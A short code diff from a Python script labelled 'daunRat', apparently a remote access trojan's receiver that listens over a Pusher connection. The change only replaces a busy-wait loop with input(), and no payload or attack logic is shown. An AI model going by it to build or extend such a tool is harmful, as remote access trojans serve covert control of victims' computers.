@@ -74,5 +74,4 @@ if __name__ == '__main__':
     print("daunRat by ANONYMUSSSS")
     receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
     receiver.connect()
-    while True:
-        pass
+    input()
